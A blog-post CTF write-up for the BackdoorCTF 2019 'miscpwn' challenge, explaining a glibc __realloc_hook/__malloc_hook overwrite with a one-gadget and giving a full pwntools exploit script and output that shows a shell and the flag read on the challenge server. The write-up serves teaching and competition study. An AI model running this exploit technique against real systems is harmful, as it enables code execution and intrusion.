---
layout: post
title:  "BackdoorCTF 2019: miscpwn"
date:   2019-10-27 23:30:02 +0800
categories: pwn
tags: BackdoorCTF
---

I played this CTF with 0x1 and got 9th place.

This was almost the exact same challenge as HITCON CTF 2019 Qualifer's Trick or Treat. Only 5 people solved it including me. I am not sure why..

### Challenge

**Points**: 405

>Trick-or-treat Revenge.
>
>[http://backdoor.static.beast.sdslabs.co/static/trick-repeat/miscpwn](http://backdoor.static.beast.sdslabs.co/static/trick-repeat/miscpwn)
>
>[http://backdoor.static.beast.sdslabs.co/static/trick-repeat/libc.so.6](http://backdoor.static.beast.sdslabs.co/static/trick-repeat/libc.so.6)
>
>`nc 51.158.118.84 17004`
>
>Flag format: CTF{...}
>
>Created by: [Nipun Gupta](https://backdoor.sdslabs.co/users/fs0ciety)
>
>No. of Correct Submissions: 5

### Solution

I won't go into much detail about this challenge since you can just read my writeup for Trick or Treat [here](/2019-10-14-hitconctf-2019-trick-or-treat/). 

The idea with this one is that you can malloc a chunk of size 10000000 and get the chunk mmapped and aligned to libc, but you are only allowed to perform one out of bounds relative write. After the write, there is a call to `malloc(0xa)` followed by `exit(0)`. Therefore, we have no choice but to overwrite `__malloc_hook`, however none of the normal one gadgets worked.

The way I went about it was to realize that right before `__malloc_hook` is `__realloc_hook`. The binary lets us write 0x10 bytes, so I solved it by first overwriting `__realloc_hook` to a working one gadget, and then overwrote `__malloc_hook` to `realloc+14`. This made it so that the constraints for one of the gadgets was suddenly met.

My exploit script is shown below:
```python
#!/usr/bin/env python2

from pwn import *

elf = ELF('./miscpwn')
libc = ELF('./libc.so.6')

HOST, PORT = '51.158.118.84', 17004

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process('./miscpwn')
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

context.terminal = ['tmux', 'new-window']
p = start()
if args.GDB:
	debug([0x13b9])

# Malloc a chunk such that it gets mmapped aligned to Libc
p.recv()
p.sendline('10000000')

# Remote binary behaves differently idek
if args.REMOTE:
	p.recvline()

# Calculate addresses required
leak = int(p.recvline().strip(), 16)
libc.address = leak + 0x989ff0
realloc_hook = libc.sym['__realloc_hook']
hook_offset = realloc_hook - leak

log.info('Chunk: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('__realloc_hook: ' + hex(realloc_hook))
log.info('Offset: ' + hex(hook_offset))

# Set the offset correctly so we reach __realloc_hook
p.recv()
p.sendline(hex(hook_offset))

# Overwrite __realloc_hook with one gadget, overwrite __malloc_hook with realloc+14
p.recv()
p.send(p64(libc.address + 0x501e3) + p64(libc.sym['realloc'] + 14))

p.interactive()
```
```sh
vagrant@ubuntu1810:/ctf/practice/backdoorctf/miscpwn$ ./exploit.py REMOTE
[*] '/ctf/practice/backdoorctf/miscpwn/miscpwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/practice/backdoorctf/miscpwn/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
REMOTE PROCESS
[+] Opening connection to 51.158.118.84 on port 17004: Done
[*] Chunk: 0x7f47cefef010
[*] Libc base: 0x7f47cf979000
[*] __realloc_hook: 0x7f47cfb5dc28
[*] Offset: 0xb6ec18
[*] Switching to interactive mode

$ ls
Dockerfile
beast.toml
flag.txt
ld-2.28.so
libc.so.6
miscpwn
miscpwn.c
post-build.sh
public
setup.sh
$ cat flag.txt
CTF{REDACTEDREDACTEDREDACTED}
$  
```